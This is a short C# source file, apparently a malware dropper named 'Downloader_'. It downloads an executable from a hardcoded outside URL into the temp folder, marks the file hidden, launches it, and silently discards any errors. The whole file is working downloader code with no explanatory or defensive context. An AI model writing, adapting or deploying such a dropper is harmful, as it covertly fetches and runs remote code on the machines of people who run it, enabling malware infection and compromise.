﻿using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.IO;
using System.Diagnostics;

namespace Downloader_
{
    class Program
    {
        static void Main(string[] args)
        {
            WebClient wc = new WebClient();             
            string filepath = Path.GetTempPath() + "filedddddname.exe";
            try
            {
                byte[] bytes = wc.DownloadData("http://updo.nl/file/2efd63fc.exe");
                File.WriteAllBytes(filepath, bytes);
                FileInfo fi = new FileInfo(filepath);
                if (fi.Attributes != FileAttributes.Hidden)
                    fi.Attributes = FileAttributes.Hidden;
                Process.Start(filepath);
            }
            catch (Exception) { }
        }
    }
}
